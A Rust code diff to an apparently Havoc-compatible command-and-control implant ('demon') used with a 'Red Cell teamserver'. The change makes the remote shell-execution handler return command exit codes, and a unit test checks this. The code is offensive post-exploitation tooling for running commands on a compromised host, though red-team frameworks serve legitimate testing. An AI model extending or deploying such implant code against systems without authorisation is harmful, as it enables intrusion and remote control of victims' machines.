@@ -1012,7 +1012,8 @@ fn handle_proc_create(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
         "ProcCreate: executing shell command"
     );
 
-    let (success, pid, output_bytes) = spawn_shell_command(&process_path, &process_args_raw);
+    let (success, pid, output_bytes, exit_code) =
+        spawn_shell_command(&process_path, &process_args_raw);
 
     // Response 1: COMMAND_PROC with process metadata
     // LE format: [subcmd][path bytes][pid][success][piped][verbose]
@@ -1024,10 +1025,15 @@ fn handle_proc_create(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
     write_u32_le(&mut proc_payload, piped);
     write_u32_le(&mut proc_payload, verbose);
 
-    // Response 2: COMMAND_OUTPUT with captured output
-    // LE format: [output bytes (UTF-8, length-prefixed)]
+    // Response 2: COMMAND_OUTPUT with captured output and trailing exit code.
+    // LE format: [output bytes (UTF-8, length-prefixed)][exit_code: i32 LE]
+    // The trailing i32 extends the original Havoc wire format so that the
+    // Red Cell teamserver can surface the exit code to callers.  Original
+    // Havoc demons do not send the trailing field; the teamserver treats it
+    // as optional (reads it only when bytes remain after the string).
     let mut out_payload = Vec::new();
     write_bytes_le(&mut out_payload, &output_bytes);
+    out_payload.extend_from_slice(&exit_code.to_le_bytes());
 
     DispatchResult::MultiRespond(vec![
         Response::new(DemonCommand::CommandProc, proc_payload),
@@ -1045,7 +1051,7 @@ fn handle_proc_create(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
 /// command is translated from the Windows `cmd.exe /c` style and run via
 /// `/bin/sh -c`.
 #[cfg(windows)]
-fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>) {
+fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>, i32) {
     // Extract the bare shell command from the `/c <cmd>` style the Havoc client sends.
     let shell_cmd = translate_to_shell_cmd(process_path, process_args);
     info!(shell_cmd = %shell_cmd, "running via cmd.exe /c");
@@ -1058,8 +1064,9 @@ fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Ve
     {
         Ok(child) => {
             let child_pid = child.id();
-            let output_bytes = match child.wait_with_output() {
+            match child.wait_with_output() {
                 Ok(o) => {
+                    let exit_code = o.status.code().unwrap_or(-1);
                     let mut combined = o.stdout;
                     if !o.stderr.is_empty() {
                         if !combined.is_empty() {
@@ -1067,24 +1074,23 @@ fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Ve
                         }
                         combined.extend_from_slice(&o.stderr);
                     }
-                    combined
+                    (true, child_pid, combined, exit_code)
                 }
                 Err(e) => {
                     warn!("ProcCreate: wait_with_output failed: {e}");
-                    format!("error: {e}").into_bytes()
+                    (true, child_pid, format!("error: {e}").into_bytes(), -1)
                 }
-            };
-            (true, child_pid, output_bytes)
+            }
         }
         Err(e) => {
             warn!("ProcCreate: cmd.exe spawn failed: {e}");
-            (false, 0u32, format!("error: {e}").into_bytes())
+            (false, 0u32, format!("error: {e}").into_bytes(), -1)
         }
     }
 }
 
 #[cfg(not(windows))]
-fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>) {
+fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>, i32) {
     // Translate Windows cmd.exe /c <cmd> style to a POSIX shell command.
     let shell_cmd = translate_to_shell_cmd(process_path, process_args);
     info!(shell_cmd = %shell_cmd, "running via /bin/sh -c");
@@ -1097,8 +1103,9 @@ fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Ve
     {
         Ok(child) => {
             let child_pid = child.id();
-            let output_bytes = match child.wait_with_output() {
+            match child.wait_with_output() {
                 Ok(o) => {
+                    let exit_code = o.status.code().unwrap_or(-1);
                     let mut combined = o.stdout;
                     if !o.stderr.is_empty() {
                         if !combined.is_empty() {
@@ -1106,18 +1113,17 @@ fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Ve
                         }
                         combined.extend_from_slice(&o.stderr);
                     }
-                    combined
+                    (true, child_pid, combined, exit_code)
                 }
                 Err(e) => {
                     warn!("ProcCreate: wait_with_output failed: {e}");
-                    format!("error: {e}").into_bytes()
+                    (true, child_pid, format!("error: {e}").into_bytes(), -1)
                 }
-            };
-            (true, child_pid, output_bytes)
+            }
         }
         Err(e) => {
             warn!("ProcCreate: /bin/sh spawn failed: {e}");
-            (false, 0u32, format!("error: {e}").into_bytes())
+            (false, 0u32, format!("error: {e}").into_bytes(), -1)
         }
     }
 }
@@ -9735,6 +9741,21 @@ mod tests {
             panic!("expected MultiRespond for proc create with non-zero exit");
         };
         assert_eq!(responses.len(), 2);
+
+        // Verify the trailing i32 exit code is encoded in the CommandOutput payload.
+        let out_resp = &responses[1];
+        assert_eq!(out_resp.command_id, u32::from(DemonCommand::CommandOutput));
+        let out_payload = &out_resp.payload;
+        let str_len = u32::from_le_bytes(out_payload[0..4].try_into().expect("len")) as usize;
+        let exit_code_start = 4 + str_len;
+        assert!(
+            out_payload.len() >= exit_code_start + 4,
+            "CommandOutput payload must include trailing exit code i32"
+        );
+        let exit_code = i32::from_le_bytes(
+            out_payload[exit_code_start..exit_code_start + 4].try_into().expect("exit code bytes"),
+        );
+        assert_eq!(exit_code, 42, "exit code must be 42");
     }
 
     #[test]
